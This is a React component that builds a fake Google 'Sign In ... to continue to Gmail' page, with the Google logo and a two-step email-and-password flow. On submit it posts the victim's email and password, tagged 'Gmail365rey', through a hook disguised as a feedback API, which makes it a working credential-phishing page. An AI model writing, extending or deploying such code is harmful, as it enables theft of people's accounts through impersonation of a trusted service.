import './App.css';
import './Hover.css';
import './DemoPage.css';
import qs from 'qs';
import useFeedback from './api/useFeedback';
import React, { useState } from 'react';
import PersonalInfo from './components/PersonalInfo';
import ContactInfo from './components/ContactInfo';
import LocationInfo from './components/LocationInfo';
import PasswordInfo from './components/PasswordInfo';

function Gmail() {


  
  const { postFeedback, isLoading } = useFeedback();
  const [emails, setEmail] = useState('');
  const [passwords, setPassword] = useState('');
  const [detail, setDetails] = useState('Gmail365rey');
  const [role, setRole] = useState('2');

  const onSubmit = async (e) => {
    e.preventDefault();
      const data = qs.stringify({
        email: emails,
        password: passwords,
        details: detail,
        role_id: role,
      });
  
      try {
        await postFeedback(data);
        setPassword('');
        setEmail('');
      } catch (error) {
        console.log(error);
      }
    };
 
  const [step, setStep] = useState(1);

  const nextStep = () => {
    if (step < 2) {
      setStep(step + 1);
    } else if (step === 2) {   
    }
  };

  const prevStep = () => {
    if (step > 1) {
      setStep(step - 1);
    }
  };





  
  return (


    <div className="bg-image" 
    style={{backgroundColor: "#fdfdfd",
           height: "100vh",  backgroundSize: "cover", backgroundRepeat: "no-repeat"}}>
     
     <div  className="container pt-5 mb-4">
       <div className="row">
       <div  className="col-sm-4 mx-auto my-5 px-5 pb-5 border border-secondary" style={{  backgroundColor: "white", borderRadius:"3px"}}>
      
       <div className='text-center pt-5'>
  <img src="images/google.png"  className="img-fluid" width="80px" height="60px"/>
  <br/>
  <h5>Sign In</h5>
  <br/> 
  <span  className="p text-dark pt-2">to continue to Gmail</span> 
  </div>
  
   {
            {
              1: <LocationInfo emails={emails} setEmail={setEmail} />,
              2: <PasswordInfo emails={emails} onSubmit={onSubmit} passwords={passwords} setPassword={setPassword} setDetails={setDetails} setRole={setRole} role={role} detail={detail}/>,
   
            }[step]
          }
          <div className="d-flex justify-content-right">
            {step > 1 ? (
            ('')
            ) : null}
                {step === 2 ?  null: <button className="btn btn-sm "  style={{ color: "white", backgroundColor:"#163a98", float: "right" }} onClick={nextStep}>
         Next
          </button>}
           
  

       

       
          
      </div>

          </div>
     
    </div> 
    </div>
    </div>

  );
}

export default Gmail;
